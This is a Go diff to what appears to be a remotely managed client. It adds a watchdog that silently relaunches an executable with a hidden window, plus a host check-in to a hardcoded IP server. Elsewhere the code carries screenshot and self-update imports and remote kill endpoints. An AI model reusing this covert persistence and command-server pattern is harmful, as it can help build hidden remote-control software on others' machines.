@@ -2,6 +2,7 @@ package lib
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"github.com/inconshreveable/go-update"
 	"github.com/kbinani/screenshot"
@@ -28,8 +29,6 @@ const MIDURL string = "http://111.231.82.173/"
 const MIDFILE string = "http://47.95.233.176/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
 const MIDETCD string = "111.231.82.173:2379"
-const MIDKILLIP string = "http://111.231.82.173:9000/Killip"
-const ALLKILL string = "http://111.231.82.173:9000/Allkill"
 const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
 const CURRENTPATH = "C:\\Windows\\Temp\\"
 
@@ -223,14 +222,64 @@ func EventStatusCode(code int, hostid string, softversion string, typ string, ad
 		Type:        typ,
 		Softversion: softversion,
 	}
-	log.Println(msg)
+	//log.Println(msg)
 	_, _, _ = gorequest.New().
 		Post(addr).
 		Set("content-type", "application/x-www-form-urlencoded").
 		Send(msg).
 		End()
 }
+func CheckDog() {
+	KillDog()
+	text, err := ioutil.ReadFile(NOGUILOG)
+	if err != nil {
+		log.Println("nogui not exits:", err)
+	}
+	current_file := strings.Split(string(text), "\\")
+	buf := bytes.Buffer{}
+	cmd := exec.Command("wmic", "process", "get", "name,processid")
+	cmd.Stdout = &buf
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Run()
 
+	cmd2 := exec.Command("findstr", current_file[len(current_file)-1])
+	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd2.Stdin = &buf
+	data, _ := cmd2.CombinedOutput()
+	//if died up
+	if len(data) == 0 {
+		cmd3 := exec.Command(string(text))
+		cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd3.Start()
+	}
+}
+
+type Check struct {
+	Hostid string `json:"hostid"`
+}
+
+func CheckInlib(addr string) error {
+	var check Check
+	msg := Msg{
+		Hostid: HOSTID,
+	}
+	resp, body, _ := gorequest.New().
+		Post("http://" + addr + "/machine/machineCheck").
+		//Set("content-type", "application/x-www-form-urlencoded").
+		Send(msg).
+		End()
+	if resp.StatusCode == 200 && body != "" {
+		if err := json.Unmarshal([]byte(body), &check); err == nil {
+			if check.Hostid == HOSTID {
+				return nil
+			} else {
+				return fmt.Errorf("not inlib")
+			}
+
+		}
+	}
+	return fmt.Errorf("not inlib")
+}
 func ListProcess() {
 	downflag := make(chan string)
 	//keep the main process live
@@ -244,7 +293,7 @@ func ListProcess() {
 	KillDog()
 	text, err := ioutil.ReadFile(NOGUILOG)
 	if err != nil {
-		log.Println("nogui 文件不存在:", err)
+		log.Println("nogui not exits:", err)
 	}
 	current_file := strings.Split(string(text), "\\")
 	buf := bytes.Buffer{}
